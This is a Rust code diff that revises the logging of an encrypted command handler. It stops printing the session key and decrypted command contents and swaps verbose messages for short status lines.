@@ -226,15 +226,14 @@ impl RxCommandHandler {
                     let shared_state = self.shared_state.lock().await;
                     shared_state.session_key.clone()
                 };
-                println!("SESSION_KEY - {:?}", session_key);
 
-                println!("COMPRESSING AND ENCRYPTING RESPONSE");
+                println!("[+] Compressing and encrypting response");
 
- 
                 let mut communication_data = communication::prepare_tx(serialized_response, &self.passphrase);
 
                 if let Some(session_key) = session_key {
-                    println!("ENCRYPTING WITH SESSION KEY");
+
+                    println!("[+] Encrypting with session key");
                     communication_data = crypto::encrypt(&communication_data, &session_key)
                 }
 
@@ -245,7 +244,7 @@ impl RxCommandHandler {
             if let Err(e) = communication::send_binary_data(&mut sender, encrypted_response).await {
                 eprintln!("Failed to send encrypted response: {}", e);
             } else {
-                println!("Encrypted response sent: {:?}", response);
+                println!("[*] Encrypted response sent.");
             }
         }
     }
@@ -272,12 +271,13 @@ impl RxCommandHandler {
 
             decrypted_command
         };
-        println!("{:?}", decrypted_command);
+        println!("[__] Command decrypted");
         serde_json::from_slice(&decrypted_command).expect("Failed to deserialize command")
     }
     
     pub async fn handle_rx(&mut self) {
         while let Some(message) = self.get_next_message().await {
+            println!("\n[-+-] Received message\n");
             match message {
                 Ok(Message::Binary(data)) => {
                     let decrypted_communications = self.decrypt_incoming_message(&data).await;
@@ -303,24 +303,24 @@ impl RxCommandHandler {
         let decrypted_data = data.to_vec();
     
         if let Some(session_key) = &shared_state.session_key {
-            println!("Attempting to decrypt with session key...");
+            println!("[_] Attempting to decrypt with session key...");
             match crypto::decrypt(&decrypted_data, session_key) {
                 Ok(decrypted) => {
-                    println!("Decryption with session key succeeded.");
+                    println!("[_] Decryption with session key succeeded.");
                     return communication::prepare_rx(decrypted, &self.passphrase)
                 }
                 Err(e) => {
-                    println!("Decryption with session key failed: {:?}", e);
+                    println!("[_] Decryption with session key failed: {:?}", e);
                 }
             }
         }
     
-        println!("Decrypting and decompressing with passphrase...");
+        println!("[+] Decrypting and decompressing with passphrase");
         communication::prepare_rx(decrypted_data, &self.passphrase)
     }
 
     async fn process_decrypted_data(&mut self, decrypted_data: Vec<u8>) {
-        println!("{:?}", String::from_utf8_lossy(&decrypted_data.to_vec()));
+        println!("[_] Processing decrypted data");
         if let Ok(envelope) = serde_json::from_slice::<Envelope>(&decrypted_data) {
             let command = self.decrypt_envelope(envelope).await;
             let response = self.handle_command(command).await;
